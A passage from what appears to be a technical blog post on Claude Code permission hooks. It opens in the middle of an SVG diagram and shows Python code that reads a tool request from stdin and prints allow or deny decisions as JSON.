x="64" y="132" fill="currentcolor" style="font-size:1em">N</text><text text-anchor="middle" x="72" y="4" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="72" y="36" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="72" y="52" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="72" y="84" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="72" y="100" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="72" y="132" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="80" y="4" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="80" y="36" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="80" y="52" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="80" y="84" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="80" y="100" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="80" y="132" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="88" y="4" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="88" y="36" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="88" y="84" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="88" y="100" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="88" y="132" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="96" y="4" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="96" y="36" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="96" y="52" fill="currentcolor" style="font-size:1em">-</text><text text-anchor="middle" x="96" y="84" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="96" y="132" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="104" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="104" y="36" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="104" y="52" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="104" y="84" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="104" y="100" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="104" y="132" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="104" y="164" fill="currentcolor" style="font-size:1em">D</text><text text-anchor="middle" x="104" y="196" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="104" y="228" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="104" y="260" fill="currentcolor" style="font-size:1em">O</text><text text-anchor="middle" x="112" y="4" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="112" y="36" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="112" y="52" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="112" y="84" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="112" y="100" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="112" y="132" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="112" y="164" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="112" y="196" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="112" y="228" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="112" y="260" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="120" y="36" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="120" y="52" fill="currentcolor" style="font-size:1em">,</text><text text-anchor="middle" x="120" y="84" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="120" y="100" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="120" y="132" fill="currentcolor" style="font-size:1em">?</text><text text-anchor="middle" x="120" y="164" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="120" y="196" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="120" y="228" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="120" y="260" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="128" y="36" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="128" y="84" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="128" y="100" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="128" y="164" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="128" y="196" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="128" y="228" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="128" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="136" y="36" fill="currentcolor" style="font-size:1em">j</text><text text-anchor="middle" x="136" y="52" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="136" y="84" fill="currentcolor" style="font-size:1em">j</text><text text-anchor="middle" x="136" y="100" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="136" y="164" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="136" y="196" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="136" y="228" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="136" y="260" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="144" y="36" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="144" y="52" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="144" y="84" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="144" y="100" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="144" y="164" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="144" y="196" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="144" y="228" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="152" y="36" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="152" y="52" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="152" y="84" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="152" y="100" fill="currentcolor" style="font-size:1em">,</text><text text-anchor="middle" x="152" y="164" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="152" y="228" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="152" y="260" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="160" y="36" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="160" y="52" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="160" y="84" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="160" y="164" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="160" y="196" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="160" y="228" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="160" y="260" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="168" y="100" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="168" y="132" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="168" y="164" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="168" y="196" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="168" y="228" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="168" y="260" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="176" y="36" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="176" y="52" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="176" y="84" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="176" y="100" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="176" y="132" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="176" y="196" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="176" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="184" y="36" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="184" y="52" fill="currentcolor" style="font-size:1em">O</text><text text-anchor="middle" x="184" y="84" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="184" y="100" fill="currentcolor" style="font-size:1em">,</text><text text-anchor="middle" x="184" y="132" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="184" y="164" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="184" y="196" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="184" y="228" fill="currentcolor" style="font-size:1em">/</text><text text-anchor="middle" x="184" y="260" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="192" y="36" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="192" y="52" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="192" y="84" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="192" y="132" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="192" y="164" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="192" y="196" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="192" y="260" fill="currentcolor" style="font-size:1em">?</text><text text-anchor="middle" x="200" y="36" fill="currentcolor" style="font-size:1em">y</text><text text-anchor="middle" x="200" y="52" fill="currentcolor" style="font-size:1em">T</text><text text-anchor="middle" x="200" y="84" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="200" y="100" fill="currentcolor" style="font-size:1em">R</text><text text-anchor="middle" x="200" y="132" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="200" y="164" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="200" y="196" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="200" y="228" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="208" y="36" fill="currentcolor" style="font-size:1em">?</text><text text-anchor="middle" x="208" y="52" fill="currentcolor" style="font-size:1em">,</text><text text-anchor="middle" x="208" y="84" fill="currentcolor" style="font-size:1em">w</text><text text-anchor="middle" x="208" y="100" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="208" y="132" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="208" y="164" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="208" y="196" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="208" y="228" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="216" y="84" fill="currentcolor" style="font-size:1em">?</text><text text-anchor="middle" x="216" y="100" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="216" y="132" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="216" y="164" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="216" y="196" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="216" y="228" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="224" y="52" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="224" y="100" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="224" y="132" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="224" y="164" fill="currentcolor" style="font-size:1em">?</text><text text-anchor="middle" x="224" y="196" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="224" y="228" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="232" y="52" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="232" y="100" fill="currentcolor" style="font-size:1em">,</text><text text-anchor="middle" x="232" y="132" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="232" y="196" fill="currentcolor" style="font-size:1em">?</text><text text-anchor="middle" x="232" y="228" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="240" y="52" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="240" y="132" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="240" y="228" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="240" y="260" fill="currentcolor" style="font-size:1em">C</text><text text-anchor="middle" x="248" y="52" fill="currentcolor" style="font-size:1em">,</text><text text-anchor="middle" x="248" y="100" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="248" y="132" fill="currentcolor" style="font-size:1em">-</text><text text-anchor="middle" x="248" y="228" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="248" y="260" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="256" y="36" fill="currentcolor" style="font-size:1em">R</text><text text-anchor="middle" x="256" y="100" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="256" y="132" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="256" y="260" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="264" y="36" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="264" y="52" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="264" y="84" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="264" y="100" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="264" y="132" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="264" y="228" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="264" y="260" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="272" y="36" fill="currentcolor" style="font-size:1em">j</text><text text-anchor="middle" x="272" y="52" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="272" y="84" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="272" y="100" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="272" y="132" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="272" y="164" fill="currentcolor" style="font-size:1em">D</text><text text-anchor="middle" x="272" y="228" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="272" y="260" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="280" y="36" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="280" y="84" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="280" y="100" fill="currentcolor" style="font-size:1em">,</text><text text-anchor="middle" x="280" y="132" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="280" y="164" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="280" y="196" fill="currentcolor" style="font-size:1em">R</text><text text-anchor="middle" x="280" y="228" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="280" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="288" y="36" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="288" y="52" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="288" y="84" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="288" y="132" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="288" y="164" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="288" y="196" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="288" y="228" fill="currentcolor" style="font-size:1em">j</text><text text-anchor="middle" x="296" y="36" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="296" y="52" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="296" y="100" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="296" y="132" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="296" y="164" fill="currentcolor" style="font-size:1em">y</text><text text-anchor="middle" x="296" y="196" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="296" y="228" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="296" y="260" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="304" y="52" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="304" y="84" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="304" y="100" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="304" y="132" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="304" y="196" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="304" y="228" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="304" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="312" y="36" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="312" y="52" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="312" y="84" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="312" y="100" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="312" y="132" fill="currentcolor" style="font-size:1em">y</text><text text-anchor="middle" x="312" y="164" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="312" y="228" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="312" y="260" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="320" y="36" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="320" y="84" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="320" y="100" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="320" y="164" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="320" y="196" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="320" y="228" fill="currentcolor" style="font-size:1em">?</text><text text-anchor="middle" x="320" y="260" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="328" y="36" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="328" y="52" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="328" y="100" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="328" y="132" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="328" y="164" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="328" y="196" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="328" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="336" y="52" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="336" y="84" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="336" y="100" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="336" y="132" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="336" y="164" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="336" y="196" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="336" y="260" fill="currentcolor" style="font-size:1em">w</text><text text-anchor="middle" x="344" y="36" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="344" y="52" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="344" y="84" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="344" y="132" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="344" y="164" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="344" y="196" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="344" y="260" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="352" y="36" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="352" y="52" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="352" y="84" fill="currentcolor" style="font-size:1em">I</text><text text-anchor="middle" x="352" y="132" fill="currentcolor" style="font-size:1em">k</text><text text-anchor="middle" x="352" y="164" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="352" y="196" fill="currentcolor" style="font-size:1em">,</text><text text-anchor="middle" x="360" y="36" fill="currentcolor" style="font-size:1em">I</text><text text-anchor="middle" x="360" y="52" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="360" y="164" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="360" y="260" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="368" y="52" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="368" y="84" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="368" y="164" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="368" y="196" fill="currentcolor" style="font-size:1em">C</text><text text-anchor="middle" x="368" y="228" fill="currentcolor" style="font-size:1em">C</text><text text-anchor="middle" x="368" y="260" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="376" y="36" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="376" y="52" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="376" y="84" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="376" y="164" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="376" y="196" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="376" y="228" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="376" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="384" y="36" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="384" y="52" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="384" y="84" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="384" y="164" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="384" y="196" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="384" y="228" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="392" y="36" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="392" y="52" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="392" y="84" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="392" y="164" fill="currentcolor" style="font-size:1em">y</text><text text-anchor="middle" x="392" y="196" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="392" y="228" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="392" y="260" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="400" y="36" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="400" y="52" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="400" y="84" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="400" y="196" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="400" y="228" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="400" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="408" y="36" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="408" y="196" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="408" y="228" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="408" y="260" fill="currentcolor" style="font-size:1em">q</text><text text-anchor="middle" x="416" y="260" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="424" y="196" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="424" y="228" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="424" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="432" y="196" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="432" y="228" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="432" y="260" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="440" y="196" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="440" y="228" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="440" y="260" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="448" y="196" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="448" y="228" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="456" y="196" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="456" y="228" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="464" y="196" fill="currentcolor" style="font-size:1em">w</text><text text-anchor="middle" x="464" y="228" fill="currentcolor" style="font-size:1em">w</text><text text-anchor="middle" x="472" y="196" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="472" y="228" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="480" y="228" fill="currentcolor" style="font-size:1em">,</text><text text-anchor="middle" x="488" y="196" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="496" y="196" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="496" y="228" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="504" y="196" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="504" y="228" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="512" y="196" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="512" y="228" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="520" y="196" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="520" y="228" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="528" y="196" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="536" y="196" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="536" y="228" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="544" y="228" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="552" y="228" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="560" y="228" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="568" y="228" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="576" y="228" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="584" y="228" fill="currentcolor" style="font-size:1em">s</text></g></svg></div><h3 id=how-the-hook-receives-requests>How the Hook Receives Requests<a hidden class=anchor aria-hidden=true href=#how-the-hook-receives-requests>#</a></h3><p>Claude Code sends a JSON object to the hook&rsquo;s stdin via the <code>PermissionRequest</code> event. The hook reads <code>tool_name</code>, <code>tool_input</code>, and <code>cwd</code> to understand what Claude wants to do:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Claude Code pipes this JSON to the hook&#39;s stdin</span>
</span></span><span style=display:flex><span>request <span style=color:#f92672>=</span> json<span style=color:#f92672>.</span>load(sys<span style=color:#f92672>.</span>stdin)
</span></span><span style=display:flex><span>tool_name <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;tool_name&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)    <span style=color:#75715e># e.g. &#34;Bash&#34;, &#34;Write&#34;, &#34;WebFetch&#34;</span>
</span></span><span style=display:flex><span>tool_input <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;tool_input&#34;</span>, {})  <span style=color:#75715e># e.g. {&#34;command&#34;: &#34;python3 script.py&#34;}</span>
</span></span><span style=display:flex><span>cwd <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;cwd&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)               <span style=color:#75715e># working directory</span>
</span></span></code></pre></div><h3 id=how-the-hook-returns-decisions>How the Hook Returns Decisions<a hidden class=anchor aria-hidden=true href=#how-the-hook-returns-decisions>#</a></h3><p>The hook communicates back to Claude Code by printing JSON to stdout. Three possible decisions:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Allow — Claude Code proceeds without prompting the user</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>allow</span>():
</span></span><span style=display:flex><span>    print(json<span style=color:#f92672>.</span>dumps({
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;hookSpecificOutput&#34;</span>: {
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;hookEventName&#34;</span>: <span style=color:#e6db74>&#34;PermissionRequest&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;decision&#34;</span>: {<span style=color:#e6db74>&#34;behavior&#34;</span>: <span style=color:#e6db74>&#34;allow&#34;</span>}
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }))
</span></span><span style=display:flex><span>    sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Deny — Claude Code blocks the action with a reason</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>deny</span>(reason: str):
</span></span><span style=display:flex><span>    print(json<span style=color:#f92672>.</span>dumps({
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;hookSpecificOutput&#34;</span>: {
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;hookEventName&#34;</span>: <span style=color:#e6db74>&#34;PermissionRequest&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;decision&#34;</span>: {<span style=color:#e6db74>&#34;behavior&#34;</span>: <span style=color:#e6db74>&#34;deny&#34;</span>, <span style=color:#e6db74>&#34;message&#34;</span>: reason}
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }))
